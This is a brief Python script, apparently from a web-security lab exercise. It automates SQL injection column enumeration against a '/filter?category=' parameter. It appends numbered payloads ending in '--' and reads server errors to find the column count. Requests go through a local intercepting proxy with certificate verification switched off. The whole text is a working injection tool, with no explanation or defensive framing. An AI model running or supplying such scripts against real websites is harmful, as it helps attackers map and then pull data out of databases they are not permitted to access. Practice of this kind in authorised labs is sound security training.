# script to get number of colummn 
#!/usr/bin/python3
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

proxy ={'http' : 'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit(url, payload ):
	path='/filter?category='
	
	for i in range(1,30):
		act_payload=payload+' '+str(i)+'--'
		#print(act_payload) 
		print(url+path+act_payload)
		#break
		r=requests.get(url+path+act_payload, verify=False, proxies=proxy)
		res = r.text
		if 'Internal Server Error' in res:
			return i-1
	


if __name__=='__main__':
	try:
		url=sys.argv[1]
		payload=sys.argv[2]
	except:
		print('[-] usage <url> <payload> ')
		print('[-] usage www.example.com 1=1')
		sys.exit()
	col =  exploit(url,payload)
	if col :
		print('number of column are :'+ str(col))
		
	else:
		print("not found")
		
